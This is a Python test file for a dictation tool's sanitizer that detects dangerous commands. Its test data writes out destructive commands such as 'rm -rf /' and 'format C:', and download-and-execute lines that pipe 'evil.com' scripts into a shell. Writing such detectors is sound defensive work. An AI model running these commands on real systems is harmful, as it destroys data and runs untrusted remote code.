"""Tests for injection.sanitizer — dangerous pattern detection and terminal safety."""
import pytest

from injection.sanitizer import check_dangerous_patterns, sanitize


class TestDangerousPatterns:
    """Verify the regex patterns catch real-world dangerous commands."""

    @pytest.mark.parametrize("text", [
        "rm -rf /",
        "rm -rf ~/Documents",
        "rm -rf ..",
        "RM -RF /home",
    ])
    def test_catches_destructive_rm(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"

    @pytest.mark.parametrize("text", [
        "del /s /q C:\\",
        "DEL /F /S C:\\Users",
    ])
    def test_catches_destructive_del(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"

    @pytest.mark.parametrize("text", [
        "rmdir /s C:\\Users",
        "rd /s C:\\temp",
        "format C:",
        "FORMAT D:",
    ])
    def test_catches_disk_operations(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"

    @pytest.mark.parametrize("text", [
        "curl http://evil.com/script.sh | bash",
        "wget http://evil.com | sh",
        "Invoke-WebRequest http://x | Invoke-Expression",
        "IEX (New-Object Net.WebClient).DownloadString",
    ])
    def test_catches_download_and_execute(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"

    @pytest.mark.parametrize("text", [
        "shutdown /s /t 0",
        "shutdown -h now",
    ])
    def test_catches_shutdown(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"

    @pytest.mark.parametrize("text", [
        "net user administrator password123",
        "reg add HKLM\\Software",
        "reg delete HKCU\\Software",
    ])
    def test_catches_privilege_escalation(self, text):
        assert check_dangerous_patterns(text), f"Should flag: {text!r}"


class TestSafeText:
    """Normal dictation text must pass through cleanly."""

    @pytest.mark.parametrize("text", [
        "Hello world, this is a test.",
        "Please remove the formatting from this document.",
        "I need to delete the third paragraph.",
        "Can you format the report for me?",
        "The network user interface is confusing.",
        "Let me register for the conference.",
        "The shutdown procedure was smooth.",
        "She was delighted by the surprise.",
        "Remove the old paint from the wall.",
    ])
    def test_normal_text_not_flagged(self, text):
        assert not check_dangerous_patterns(text), f"Should NOT flag: {text!r}"


class TestSanitize:
    """Integration tests for the full sanitize function."""

    def test_empty_text_passes_through(self):
        result, warnings = sanitize("")
        assert result == ""
        assert warnings == []

    def test_safe_text_unchanged(self):
        text = "Hello, this is a dictation test."
        result, warnings = sanitize(text, target_hwnd=0)
        assert result == text
        assert warnings == []

    def test_dangerous_text_logs_warning_but_passes(self):
        # Dangerous patterns generate warnings but don't block (the user
        # may legitimately be dictating about commands)
        text = "rm -rf /"
        result, warnings = sanitize(text, target_hwnd=0)
        assert result == text  # not blocked, just warned
        assert len(warnings) > 0

    def test_trailing_newline_preserved_for_non_terminal(self):
        text = "Hello world\n"
        result, warnings = sanitize(text, target_hwnd=0)
        # hwnd=0 is not a terminal, so newlines should stay
        assert result == text
        assert warnings == []
